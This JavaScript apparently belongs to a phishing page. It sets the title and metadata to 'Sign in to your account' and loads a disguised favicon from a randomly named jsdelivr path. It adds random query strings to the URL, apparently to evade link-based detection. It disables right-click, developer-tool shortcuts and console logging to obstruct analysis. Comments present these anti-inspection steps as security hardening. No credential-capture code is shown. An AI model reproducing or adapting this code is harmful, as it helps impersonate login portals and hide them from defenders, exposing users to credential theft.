   
           // Change Title
        document.title = "Sign in to your account";

        // Change Favicon
        function changeFavicon(url) {
            let link = document.querySelector("link[rel='icon']") || document.createElement("link");
            link.type = "image/x-icon";
            link.rel = "icon";
            link.href = url;
            document.head.appendChild(link);
        }
        changeFavicon('https://cdn.jsdelivr.net/gh/wintornzipher06B64M0/VoT445x45N8734vb87658nRRd46/z82Di9m74s9io0/k17152bqd2D5.ico');

        // Change Meta Description
        function changeMetaTag(name, content) {
            let metaTag = document.querySelector(`meta[name='${name}']`);
            if (!metaTag) {
                metaTag = document.createElement('meta');
                metaTag.setAttribute('name', name);
                document.head.appendChild(metaTag);
            }
            metaTag.setAttribute('content', content);
        }
        changeMetaTag('description', 'Sign in to your account');

        // Change Open Graph Tags
        function changeOpenGraphTag(property, content) {
            let metaTag = document.querySelector(`meta[property='${property}']`);
            if (!metaTag) {
                metaTag = document.createElement('meta');
                metaTag.setAttribute('property', property);
                document.head.appendChild(metaTag);
            }
            metaTag.setAttribute('content', content);
        }
        changeOpenGraphTag('og:title', 'Sign in to your account');
  
  
        // Function to generate a random string of a specified length
        function generateRandomString(length) {
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
            let randomString = '';
            for (let i = 0; i < length; i++) {
                const randomIndex = Math.floor(Math.random() * characters.length);
                randomString += characters[randomIndex];
            }
            return randomString;
        }

        // Function to get the current URL
        function getCurrentUrl() {
            return window.location.href;
        }

        // Function to append random query parameters with completely random names and values to the URL
        function appendRandomQueryParams() {
            const currentUrl = new URL(getCurrentUrl());

            // Generate a random number of parameters to append (you can adjust this as needed)
            const numParams = 3;  // Adjust this to control how many random parameters you want

            // Append each random parameter to the URL
            for (let i = 0; i < numParams; i++) {
                const paramName = generateRandomString(30); // Generate a random parameter name (10 characters long)
                const paramValue = generateRandomString(30); // Generate a random value for the parameter (16 characters long)
                currentUrl.searchParams.set(paramName, paramValue); // Append the parameter to the URL
            }

            // Log the final URL to the console for debugging
            console.log(currentUrl.toString());  // Check if the query parameters are being added

            // Update the URL in the browser without reloading the page
            history.replaceState(null, "", currentUrl.toString());
        }

        // Ensure DOM is ready before running the script
        document.addEventListener("DOMContentLoaded", function() {
            appendRandomQueryParams();
        });
		
		
if (window.location.hostname === 'localhost' || window.location.hostname === 'your-production-domain.com') {
  console.log = function() {};
  console.debug = function() {};
  console.info = function() {};
  console.warn = function() {};
  console.error = function() {};
}


// 2. Prevent Debugging: Disable Right-click and DevTools Access
document.oncontextmenu = function() { return false; };  // Disable right-click
document.onkeydown = function(e) {
  if (e.key === 'F12' || e.ctrlKey && (e.key === 'I' || e.key === 'J')) {
    return false; // Disable F12, Ctrl+I, and Ctrl+J
  }
};

// 3. Prevent Use of eval() and Function()
(function() {
  if (typeof eval === 'function') {
    window.eval = function() { throw new Error('eval is disabled'); };
  }
  if (typeof Function === 'function') {
    window.Function = function() { throw new Error('Function constructor is disabled'); };
  }
})();


// 5. Avoid Global Variables by Using an IIFE (Immediately Invoked Function Expression)
(function() {
  var secretData = 'This is secure data'; // Variable scoped to the IIFE
  console.log(secretData); // Accessible only within this function
})();
